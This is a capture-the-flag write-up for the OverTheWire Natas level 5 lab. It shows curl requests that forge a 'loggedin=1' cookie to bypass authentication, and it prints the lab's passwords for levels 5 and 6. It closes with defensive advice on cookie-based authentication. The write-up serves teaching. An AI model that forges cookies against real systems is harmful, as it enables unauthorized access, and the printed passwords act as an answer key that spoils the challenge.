---
category: natas
title: Natas5 - HTTP Cookie
---
website: http://natas5.natas.labs.overthewire.org/ (password: iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq)

After going to natas5 link, it said <small>Access disallowed. You are not logged in</small>. Obviously this is related with web authentication. The HTML itself didn't provide us much info, so again I went to explore the HTTP headers. To see what the headers returned in an HTTP response, I used "curl -i". The result is given below:

```console
$ curl -i http://natas5:iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq@natas5.natas.labs.overthewire.org
HTTP/1.1 200 OK
Date: Sat, 20 Jul 2019 00:08:50 GMT
Server: Apache/2.4.10 (Debian)
Set-Cookie: loggedin=0
Vary: Accept-Encoding
Content-Length: 855
Content-Type: text/html; charset=UTF-8

<html>
<head>
... ...              <== skipped
<div id="content">
Access disallowed. You are not logged in</div>
</body>
</html>
```

As you can see, it has a header "Set-Cookie", which means that this website is using cookie. Moreover, the cookie reads as "loggedin=0". This is a good sign that this website uses cookie for authentication and authorization. Thus, I can explicitly specify my cookie in my HTTP request to impersonate an authorized user. The following HTTP request does the trick:

```console
$ curl -H "cookie: loggedin=1" http://natas5:iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq@natas5.natas.labs.overthewire.org
<html>
<head>
... ...              <== skipped
<div id="content">
Access granted. The password for natas6 is aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1</div>
</body>
</html>
```

We now have the password for the next level.

<strong>CONCLUSION</strong>

Cookies can be used to keep track of users. However, they can be manipulated by attackers. Thus, be careful if you are using cookies for authentication because it can be hijacked.

More details about cookie can be found here:
- <a href="https://en.wikipedia.org/wiki/HTTP_cookie">HTTP cookie</a>
- <a href="https://swagger.io/docs/specification/authentication/cookie-authentication/">Cookie Authentication</a>
- <a href="https://www.freecodecamp.org/news/session-hijacking-and-how-to-stop-it-711e3683d1ac/">What is session hijacking and how you can stop it</a>
